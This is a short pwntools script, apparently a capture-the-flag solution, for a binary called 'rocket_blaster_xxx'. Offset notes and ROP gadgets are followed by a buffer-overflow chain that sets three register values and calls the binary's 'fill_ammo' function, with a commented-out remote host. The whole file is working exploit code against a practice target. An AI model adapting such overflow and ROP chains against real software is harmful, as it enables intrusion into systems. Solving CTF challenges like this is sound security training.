'''
cyclic 1024
gdb-pwndbg ./rocket_blaster_xxx
cyclic -l jaaa

36+4 == 40

0x000000000040159f : pop rdi ; ret
0x000000000040159d : pop rsi ; ret
0x000000000040159b : pop rdx ; ret

'''

from pwn import *
#context.log_level = 'debug'

offset = 40

fill_ammo = 0x4012f5

shellcode = offset*b'A'+p64(0x000000000040159f) + p64(0xdeadbeef) + p64(0x000000000040159d) + p64(0xdeadbabe) + p64(0x000000000040159b) + p64(0xdead1337) + p64(fill_ammo)

#ip, port = '94.237.53.121', 41229
#io = remote(ip, port)
#io = process('./rocket_blaster_xxx')
io = gdb.debug('./rocket_blaster_xxx', 'break main')

io.recvuntil('>>')
io.sendline(shellcode)
print(io.recvall())
